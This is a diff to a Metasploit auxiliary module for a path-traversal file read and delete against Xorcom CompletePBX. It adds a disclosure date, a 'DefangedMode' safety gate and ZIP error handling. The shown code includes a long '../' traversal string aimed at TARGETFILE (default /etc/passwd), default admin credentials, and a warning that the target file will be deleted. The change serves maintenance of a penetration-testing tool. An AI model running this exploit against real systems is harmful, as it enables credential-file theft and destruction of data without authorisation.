@@ -6,7 +6,7 @@
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
 
-  def initialize
+  def initialize(info = {})
     super(
       update_info(
         info,
@@ -29,6 +29,7 @@ class MetasploitModule < Msf::Auxiliary
           ['URL', 'https://www.xorcom.com/products/completepbx/'],
           ['URL', 'https://chocapikk.com/posts/2025/completepbx/']
         ],
+        'DisclosureDate' => '2025-03-02',
         'Notes' => {
           'Stability' => [CRASH_SAFE, OS_RESOURCE_LOSS],
           'SideEffects' => [IOC_IN_LOGS],
@@ -44,6 +45,11 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('USERNAME', [true, 'Username for authentication', 'admin']),
         OptString.new('PASSWORD', [true, 'Password for authentication', 'admin']),
         OptString.new('TARGETFILE', [true, 'File to retrieve from the system', '/etc/passwd'])
+      ]
+    )
+    register_advanced_options(
+      [
+        OptBool.new('DefangedMode', [ true, 'Run in defanged mode', true ])
       ]
     )
   end
@@ -80,9 +86,21 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
-    print_warning('This exploit WILL delete the target file if permissions allow.')
+    if datastore['DefangedMode']
+      warning = <<~EOF
 
-    sleep(3)
+        Are you *SURE* you want to execute the module against the target?
+        Running this module will attempt to read and delete the file
+        specified by TARGETFILE on the remote system.
+
+        If you have explicit authorisation, re-run with:
+            set DefangedMode false
+      EOF
+      fail_with(Failure::BadConfig, warning)
+    end
+
+    print_warning('This exploit WILL delete the target file if permissions allow.')
+    sleep(2)
 
     sid_cookie = login
     target_file = "../../../../../../../../../../..#{datastore['TARGETFILE']}"
@@ -135,34 +153,36 @@ class MetasploitModule < Msf::Auxiliary
 
   def list_files_in_zip(zip_data)
     files = []
-
-    ::Zip::InputStream.open(StringIO.new(zip_data)) do |io|
-      while (entry = io.get_next_entry)
-        files << entry.name
+    begin
+      ::Zip::InputStream.open(StringIO.new(zip_data)) do |io|
+        while (entry = io.get_next_entry)
+          files << entry.name
+        end
       end
+    rescue ::Zip::Error, ::IOError, ::ArgumentError => e
+      fail_with(Failure::UnexpectedReply, "Invalid ZIP data: #{e.class} - #{e.message}")
     end
-
     files
   end
 
   def read_file_from_zip(zip_data, target_filename, files_list)
-    file_content = nil
-
     possible_matches = files_list.select { |f| f.include?(target_filename) }
-
-    if possible_matches.empty?
-      return nil
-    end
+    return nil if possible_matches.empty?
 
     correct_filename = possible_matches.first
+    file_content = nil
 
-    ::Zip::InputStream.open(StringIO.new(zip_data)) do |io|
-      while (entry = io.get_next_entry)
-        if entry.name == correct_filename
-          file_content = io.read
-          break
+    begin
+      ::Zip::InputStream.open(StringIO.new(zip_data)) do |io|
+        while (entry = io.get_next_entry)
+          if entry.name == correct_filename
+            file_content = io.read
+            break
+          end
         end
       end
+    rescue ::Zip::Error, ::IOError, ::ArgumentError => e
+      fail_with(Failure::UnexpectedReply, "Error reading ZIP archive: #{e.class} - #{e.message}")
     end
 
     file_content
